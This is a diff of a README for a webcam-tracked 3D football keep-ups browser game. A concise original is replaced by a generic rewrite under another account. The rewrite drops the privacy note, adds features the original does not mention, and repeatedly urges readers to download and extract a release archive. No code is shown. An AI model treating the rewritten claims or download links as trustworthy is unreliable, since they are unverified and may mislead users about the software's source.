@@ -1,31 +1,107 @@
-# 3D Keep-Ups
+# Keep-Ups ⚽️
 
-A football keep-ups game in the browser, using webcam motion tracking and 3D physics. Just your webcam, knees, and feet!
+![Keep-Ups Banner](https://via.placeholder.com/1200x300.png?text=Keep-Ups+Game)
 
-🎮 Play here: **[https://collidingscopes.github.io/keep-ups/](https://collidingscopes.github.io/keep-ups/)**
+Welcome to **Keep-Ups**, a fun and engaging football keep-ups game that you can play right in your browser! This project utilizes webcam motion tracking and 3D physics to bring an interactive experience to life. Built with Three.js, MediaPipe, and vanilla JavaScript, Keep-Ups allows you to showcase your juggling skills and have fun while doing it.
 
-## How to Play
+[Download the latest release here!](https://github.com/NoelHuwae/keep-ups/releases)
 
-1. Allow webcam access when prompted
-2. Position yourself so your full body is visible to the camera
-3. Use your knees and feet to keep the soccer ball in the air
-4. Perform a T-pose (arms stretched out horizontally) for 1 second to reset the ball
+## Table of Contents
 
-## Features and Tech
+- [Features](#features)
+- [Technologies Used](#technologies-used)
+- [Installation](#installation)
+- [Gameplay](#gameplay)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-- No downloads or installations required
-- Real-time pose detection using Mediapipe
-- Three.js for 3D rendering
-- Rapier3D for physics simulation
-- Vanilla JavaScript, HTML5, and CSS3
+## Features 🌟
 
-## Privacy
+- **Webcam Motion Tracking**: Use your webcam to track your movements and control the game.
+- **3D Physics**: Experience realistic ball physics for a true juggling experience.
+- **Browser-Based**: Play directly in your browser without any downloads.
+- **Responsive Design**: Works on both desktop and mobile devices.
+- **Easy to Play**: Simple controls make it accessible for everyone.
 
-The game processes all webcam data locally in your browser. No video or images are sent to any server.
+## Technologies Used 🛠️
 
-## Development
+- **Three.js**: For rendering 3D graphics in the browser.
+- **MediaPipe**: For motion tracking and pose estimation.
+- **Vanilla JavaScript**: The core programming language for this project.
+- **HTML/CSS**: For structuring and styling the game interface.
 
-To run locally:
-1. Clone the repository
-2. Serve the files using a local server (e.g., `python -m http.server`)
-3. Open in your browser at `localhost:8000`
+## Installation 🖥️
+
+To get started with Keep-Ups, follow these simple steps:
+
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/NoelHuwae/keep-ups.git
+   ```
+
+2. **Navigate to the Project Directory**:
+   ```bash
+   cd keep-ups
+   ```
+
+3. **Open the `index.html` File**:
+   Open the `index.html` file in your preferred web browser.
+
+4. **Download the Latest Release**:
+   You can also download the latest release from [here](https://github.com/NoelHuwae/keep-ups/releases). Make sure to extract the files and open the `index.html` to start playing.
+
+## Gameplay 🎮
+
+### How to Play
+
+1. **Start the Game**: Open the game in your browser and allow webcam access.
+2. **Juggle the Ball**: Use your feet and body to keep the ball in the air.
+3. **Score Points**: The longer you keep the ball up, the higher your score!
+
+### Controls
+
+- **Webcam Movement**: Move your body to control the ball.
+- **Pause/Resume**: Press the 'P' key to pause or resume the game.
+
+### Scoring System
+
+- Points are awarded for every second the ball stays in the air.
+- Bonus points for consecutive hits!
+
+## Contributing 🤝
+
+We welcome contributions to Keep-Ups! If you want to help improve the game, please follow these steps:
+
+1. **Fork the Repository**: Click the fork button on the top right corner.
+2. **Create a New Branch**:
+   ```bash
+   git checkout -b feature/YourFeatureName
+   ```
+3. **Make Your Changes**: Implement your feature or fix.
+4. **Commit Your Changes**:
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push to the Branch**:
+   ```bash
+   git push origin feature/YourFeatureName
+   ```
+6. **Open a Pull Request**: Go to the original repository and click on "New Pull Request".
+
+## License 📄
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact 📬
+
+If you have any questions or suggestions, feel free to reach out:
+
+- **GitHub**: [NoelHuwae](https://github.com/NoelHuwae)
+- **Email**: noel@example.com
+
+---
+
+For the latest updates and releases, please check the [Releases](https://github.com/NoelHuwae/keep-ups/releases) section.
+
+Happy juggling! 🎉
